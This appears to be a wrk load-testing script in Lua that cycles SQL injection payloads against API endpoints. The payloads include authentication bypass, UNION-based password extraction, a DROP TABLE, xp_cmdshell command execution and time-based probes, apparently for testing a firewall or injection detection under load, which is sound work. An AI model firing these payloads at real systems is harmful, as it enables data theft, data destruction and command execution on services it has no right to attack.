local payloads = {
  "/api/login?user=admin' OR 1=1--",
  "/api/search?q=1' UNION SELECT null,null,null--",
  "/api/user?id=1; DROP TABLE users--",
  "/api/data?filter=1' AND 1=1--",
  "/api/query?q=' OR 'a'='a",
  "/api/item?id=1' OR '1'='1' /*",
  "/api/list?sort=1; EXEC xp_cmdshell('dir')--",
  "/api/view?id=1' AND SLEEP(5)--",
  "/api/export?q=1' UNION ALL SELECT password FROM admin--",
  "/api/check?id=1 OR 1=1#"
}
local counter = 0

request = function()
  counter = counter + 1
  local path = payloads[(counter % #payloads) + 1]
  return wrk.format("GET", path, {
    ["User-Agent"] = "Mozilla/5.0",
    ["Accept"] = "*/*"
  })
end
